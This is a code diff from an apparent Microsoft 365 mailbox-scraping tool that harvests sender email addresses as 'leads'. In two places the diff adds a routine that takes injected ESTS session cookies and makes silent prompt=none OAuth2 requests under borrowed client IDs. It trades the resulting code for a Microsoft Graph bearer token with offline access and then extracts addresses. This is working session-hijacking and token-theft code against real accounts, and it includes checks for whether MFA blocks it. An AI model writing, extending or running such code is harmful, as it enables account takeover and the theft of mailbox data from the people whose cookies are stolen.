@@ -1567,90 +1567,64 @@ def extract_owa_session(
                     break
                 offset_owa += page_size
 
-    # ── Strategy 1b: New Outlook ows/ API (no canary needed, works with session cookies) ──
-    # The new Outlook web app at outlook.office.com uses ows/ endpoints
-    # that accept the same session cookies as OWA — no canary required.
-    if not owa_worked:
-        _ows_base = "https://outlook.office.com/ows/v1.0/me"
-        _ows_worked = False
-        import datetime as _dt2
-        _date_filter = (_dt2.datetime.utcnow() - _dt2.timedelta(days=days_back)).strftime("%Y-%m-%dT00:00:00Z")
-
-        for _ows_folder in (folders or ["inbox", "sentitems", "deleteditems", "junkemail"]):
-            if total >= limit:
+    # ── Strategy 1b: OAuth2 silent auth (ESTS cookies → Graph Bearer token) ──────────
+    # New Outlook (Monarch) doesn't expose a session-cookie REST API.
+    # Instead we perform an OAuth2 authorize request with prompt=none — if the
+    # injected ESTS cookies are valid, Microsoft silently issues an auth code
+    # which we exchange for a Graph Bearer token, then delegate to extract_graph().
+    if not owa_worked and not canary:
+        yield {"type": "progress", "msg": "No OWA canary — trying OAuth2 silent auth via ESTS cookies…"}
+        _silent_token = None
+        import urllib.parse as _urlparse
+        for _cid in [cid for _, cid in MS_APPS[:3]]:
+            if _silent_token:
                 break
-            _folder_api = {
-                "inbox": "inbox", "sentitems": "SentItems", "deleteditems": "DeletedItems",
-                "junkemail": "JunkEmail",
-            }.get(_ows_folder.lower(), _ows_folder)
-
-            _ows_url = f"{_ows_base}/MailFolders/{_folder_api}/messages"
-            _ows_params = {
-                "$select": "from,receivedDateTime",
-                "$top": 100,
-                "$filter": f"receivedDateTime ge {_date_filter}",
-            }
-            yield {"type": "progress", "msg": f"Trying new OWA API for {_folder_api}…"}
-
-            while _ows_url and total < limit:
+            for _tenant in ["common", "organizations"]:
                 try:
-                    _r = session.get(
-                        _ows_url,
-                        params=_ows_params,
-                        headers={"User-Agent": _UA, "Accept": "application/json",
-                                 "Origin": "https://outlook.office.com"},
-                        timeout=30,
+                    _silent_url = (
+                        f"https://login.microsoftonline.com/{_tenant}/oauth2/v2.0/authorize"
+                        f"?client_id={_cid}"
+                        f"&response_type=code"
+                        f"&response_mode=query"
+                        f"&redirect_uri=" + _urlparse.quote("https://login.microsoftonline.com/common/oauth2/nativeclient", safe="") +
+                        f"&scope=" + _urlparse.quote("https://graph.microsoft.com/.default offline_access", safe="") +
+                        f"&prompt=none"
                     )
-                    _ows_params = {}  # clear params after first page (nextLink has them)
-                except Exception as _e:
-                    yield {"type": "progress", "msg": f"ows/ error: {_e}"}
-                    break
-
-                if not _r.ok:
-                    yield {"type": "progress", "msg": f"ows/ {_folder_api}: HTTP {_r.status_code}"}
-                    break
-
-                try:
-                    _data = _r.json()
-                except Exception:
-                    break
-
-                _msgs = _data.get("value", [])
-                if not _msgs:
-                    break
-
-                _ows_worked = True
-                _ows_url = _data.get("@odata.nextLink")
-
-                for _m in _msgs:
-                    if total >= limit:
+                    _ar = session.get(_silent_url, allow_redirects=True,
+                                      timeout=15, headers={"User-Agent": _UA})
+                    _code_m = re.search(r'[?&]code=([^&#]+)', _ar.url)
+                    if _code_m:
+                        _code = _urlparse.unquote(_code_m.group(1))
+                        _tok_r = session.post(
+                            f"https://login.microsoftonline.com/{_tenant}/oauth2/v2.0/token",
+                            data={"grant_type": "authorization_code", "code": _code,
+                                  "redirect_uri": "https://login.microsoftonline.com/common/oauth2/nativeclient",
+                                  "client_id": _cid,
+                                  "scope": "https://graph.microsoft.com/.default offline_access"},
+                            timeout=15,
+                        )
+                        if _tok_r.ok:
+                            _silent_token = _tok_r.json().get("access_token", "")
+                            if _silent_token:
+                                break
+                    elif "error=interaction_required" in _ar.url or "error=login_required" in _ar.url:
+                        yield {"type": "progress", "msg": f"Silent auth ({_tenant}): MFA/interaction required"}
                         break
-                    try:
-                        _frm = (_m.get("from") or {}).get("emailAddress") or {}
-                        _addr = (_frm.get("address") or "").strip().lower()
-                        if not _addr or "@" not in _addr:
-                            continue
-                        if _addr in seen:
-                            continue
-                        if filter_generic and GENERIC_RE.match(_addr.split("@")[0]):
-                            continue
-                        if only_domains and _addr.split("@")[-1] not in only_domains:
-                            continue
-                        if block_domains and _addr.split("@")[-1] in block_domains:
-                            continue
-                        seen.add(_addr)
-                        total += 1
-                        yield {"type": "lead", "email": _addr}
-                    except Exception:
-                        continue
+                except Exception as _se:
+                    yield {"type": "progress", "msg": f"Silent auth error: {_se}"}
+                    break
 
-                yield {"type": "progress", "msg": f"ows/ {_folder_api}: {total} total leads so far"}
-
-        if _ows_worked:
-            yield {"type": "done", "total": total}
+        if _silent_token:
+            yield {"type": "progress", "msg": "✓ Silent auth token obtained — switching to Graph API extraction"}
+            yield from extract_graph(
+                token=_silent_token, folder_ids=folders,
+                limit=limit, filter_generic=filter_generic,
+                only_domains=only_domains, block_domains=block_domains,
+                days_back=days_back,
+            )
             return
-        elif not canary:
-            yield {"type": "progress", "msg": "ows/ API also failed — trying EWS…"}
+        else:
+            yield {"type": "progress", "msg": "OAuth2 silent auth failed — ESTS cookies may be expired or MFA is enforced"}
 
     # ── Strategy 2: EWS SOAP fallback ─────────────────────────────
     if not owa_worked:
@@ -3558,6 +3532,44 @@ class B2BSession:
                         _upgrade_token = _tr2.json().get("access_token", "")
                 except Exception:
                     pass
+            if not _upgrade_token:
+                # OAuth2 silent auth: ESTS cookies → auth code → Graph Bearer token
+                # prompt=none causes Microsoft to silently issue a code if ESTS is valid
+                yield {"type": "progress", "msg": "Trying OAuth2 silent auth (ESTS → Graph token)…"}
+                for _cid in [cid for _, cid in MS_APPS[:3]]:
+                    if _upgrade_token:
+                        break
+                    for _tenant in ["common", "organizations"]:
+                        try:
+                            import urllib.parse as _up
+                            _silent_url = (
+                                f"https://login.microsoftonline.com/{_tenant}/oauth2/v2.0/authorize"
+                                f"?client_id={_cid}"
+                                f"&response_type=code"
+                                f"&response_mode=query"
+                                f"&redirect_uri=" + _up.quote("https://login.microsoftonline.com/common/oauth2/nativeclient", safe="") +
+                                f"&scope=" + _up.quote("https://graph.microsoft.com/.default offline_access", safe="") +
+                                f"&prompt=none"
+                            )
+                            _ar = owa.get(_silent_url, allow_redirects=True,
+                                          timeout=15, headers={"User-Agent": _UA_up})
+                            _code_m = re.search(r'[?&]code=([^&#]+)', _ar.url)
+                            if _code_m:
+                                _code = _up.unquote(_code_m.group(1))
+                                _tok_r = owa.post(
+                                    f"https://login.microsoftonline.com/{_tenant}/oauth2/v2.0/token",
+                                    data={"grant_type": "authorization_code", "code": _code,
+                                          "redirect_uri": "https://login.microsoftonline.com/common/oauth2/nativeclient",
+                                          "client_id": _cid,
+                                          "scope": "https://graph.microsoft.com/.default offline_access"},
+                                    timeout=15,
+                                )
+                                if _tok_r.ok:
+                                    _upgrade_token = _tok_r.json().get("access_token", "")
+                                    if _upgrade_token:
+                                        break
+                        except Exception:
+                            pass
             if _upgrade_token:
                 yield {"type": "progress", "msg": "✓ Upgraded OWA session to Graph API token — using Graph extraction"}
                 self._s["ms_token"] = _upgrade_token
